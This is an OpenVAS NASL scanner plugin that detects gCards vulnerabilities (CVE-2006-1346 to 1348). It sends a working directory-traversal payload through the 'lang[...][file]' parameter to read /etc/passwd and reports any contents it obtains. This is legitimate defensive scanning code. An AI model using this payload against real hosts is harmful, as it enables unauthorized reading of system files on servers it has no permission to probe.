# OpenVAS Vulnerability Test
# $Id: gcards_dir_transversal.nasl 16 2013-10-27 13:09:52Z jan $
# Description: gCards Multiple Vulnerabilities
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2006 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote web server contains a PHP application that is prone to
multiple vulnerabilities. 

Description :

The remote host is running gCards, a free electronic greeting card
system written in PHP. 

The installed version of gCards fails to sanitize user input to the
'setLang' parameter in the 'inc/setLang.php' script which is called by
'index.php'.  An unauthenticated attacker may be able to exploit this
issue to read arbitrary local files or execute code from local files
subject to the permissions of the web server user id. 

There are also reportedly other flaws in the installed application,
including a directory traversal issue that allows reading of local
files as well as a SQL injection and a cross-site scripting issue.";

tag_solution = "Upgrade to gCards version 1.46 or later.";

desc = "
Summary:
" + tag_summary + "
Solution:
" + tag_solution;
if (description) {
script_id(80065);;
script_version("$Revision: 16 $");
script_tag(name:"last_modification", value:"$Date: 2013-10-27 14:09:52 +0100 (Sun, 27 Oct 2013) $");
script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
script_tag(name:"cvss_base", value:"7.5");
script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
script_tag(name:"risk_factor", value:"High");

script_cve_id("CVE-2006-1346", "CVE-2006-1347", "CVE-2006-1348");
script_bugtraq_id(17165);
script_xref(name:"OSVDB", value:"24016");
script_xref(name:"OSVDB", value:"24017");
script_xref(name:"OSVDB", value:"24018");

name = "gCards Multiple Vulnerabilities";
script_name(name);

script_description(desc);

summary = "Checks for directory transversal in gCards index.php script";
script_summary(summary);

script_category(ACT_ATTACK);
script_family("Web application abuses");

script_copyright("This script is Copyright (C) 2006 Josh Zlatin-Amishav");

script_dependencies("http_version.nasl");
script_require_ports("Services/www", 80);
script_exclude_keys("Settings/disable_cgi_scanning");

if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
}
script_xref(name : "URL" , value : "http://retrogod.altervista.org/gcards_145_xpl.html");
script_xref(name : "URL" , value : "http://www.gregphoto.net/index.php/2006/03/27/gcards-146-released-due-to-security-issues/");
exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


if (thorough_tests) dirs = make_list("/gcards", cgi_dirs());
else dirs = make_list(cgi_dirs());

# Loop through CGI directories.
foreach dir (dirs) {
  # Try to exploit the flaw in setLang.php to read /etc/passwd.
  lang = SCRIPT_NAME;
  req = http_get(
    item:string(
    dir, "/index.php?",
    "setLang=", lang, "&",
    "lang[", lang, "][file]=../../../../../../../../../../../../etc/passwd"
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    egrep(pattern:">gCards</a> v.*Graphics by Greg gCards", string:res) &&
    (
      # there's an entry for root or ...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(inc/lang/.+/etc/passwd\).+ failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction
      egrep(pattern:"main.+ open_basedir restriction in effect\. File\(\./inc/lang/.+/etc/passwd", string:res)
    )
  ) {
    if (egrep(pattern:"root:.*:0:[01]:", string:res))
      content = res - strstr(res, '<!DOCTYPE HTML PUBLIC');

    if (content)
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "OpenVAS was able to read from the remote host :\n",
        "\n",
        content
      );
    else report = desc;

    security_hole(port:port, data:report);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
